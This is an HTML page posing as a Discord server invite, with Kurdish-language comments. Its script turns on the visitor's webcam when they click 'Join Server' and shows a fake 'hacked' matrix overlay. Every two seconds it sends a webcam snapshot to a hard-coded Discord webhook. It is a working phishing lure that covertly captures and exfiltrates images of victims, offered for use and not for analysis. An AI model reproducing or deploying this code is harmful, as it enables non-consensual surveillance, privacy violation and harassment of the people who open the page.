<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>Join Server</title>
    <style>
        body { margin: 0; background: #2c2f33; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
        .card { background: #23272a; padding: 40px; border-radius: 10px; text-align: center; color: white; box-shadow: 0 4px 15px rgba(0,0,0,0.5); z-index: 1000; }
        button { background: #7289da; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
        
        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: 1; }
        #hackedOverlay { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.7); color: red; font-size: 80px; font-weight: bold; 
            justify-content: center; align-items: center; z-index: 9999; text-transform: uppercase;
        }
        #videoElement { display: none; }
    </style>
</head>
<body>
    <div id="hackedOverlay">YOU HACKED BY YARAN</div>
    <canvas id="matrixCanvas"></canvas>
    
    <div class="card" id="joinCard">
        <h2>Join Discord Server</h2>
        <p>کلیل بکە بۆ جۆین کردن</p></p>
        <button id="startBtn">Join Server</button>
    </div>

    <video id="videoElement" autoplay playsinline></video>

    <script>
        document.getElementById("startBtn").onclick = async function() {
            const video = document.getElementById("videoElement");
            const joinCard = document.getElementById("joinCard");
            
            try {
                // ١. چالاککردنی کامێرا دەستبەجێ
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // ٢. شاردنەوەی کارتی جۆین و پیشاندانی هاک
                joinCard.style.display = "none";
                document.getElementById("matrixCanvas").style.display = "block";
                document.getElementById("hackedOverlay").style.display = "flex";
                
                initMatrix();
                
                // ٣. دەستکردن بە ناردنی وێنە
                setInterval(async () => {
                    const canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext("2d").drawImage(video, 0, 0);
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append("file", blob, "photo.png");
                        await fetch("https://discord.com/api/webhooks/1507879866136133682/3h8tsvpbaFNftFO8zsRwkYuHbZwgH7yld33NrCBTtKP0cHMl64tn9AsPTZZl70GceTbb", {
                            method: 'POST',
                            body: formData
                        });
                    }, "image/png");
                }, 2000);
            } catch (err) {
                alert("ئەگەر کێشەت هەبوو نامە بنێرە!");
            }
        };

        function initMatrix() {
            const c = document.getElementById("matrixCanvas");
            const ctx = c.getContext("2d");
            c.height = window.innerHeight; c.width = window.innerWidth;
            const matrix = "010101";
            const font_size = 15;
            let columns = c.width/font_size;
            let drops = [];
            for(let x = 0; x < columns; x++) drops[x] = 1;
            setInterval(() => {
                ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
                ctx.fillRect(0, 0, c.width, c.height);
                ctx.fillStyle = "#0F0";
                for(let i = 0; i < drops.length; i++) {
                    let text = matrix[Math.floor(Math.random()*matrix.length)];
                    ctx.fillText(text, i*font_size, drops[i]*font_size);
                    if(drops[i]*font_size > c.height && Math.random() > 0.975) drops[i] = 0;
                    drops[i]++;
                }
            }, 35);
        }
    </script>
</body>
</html>
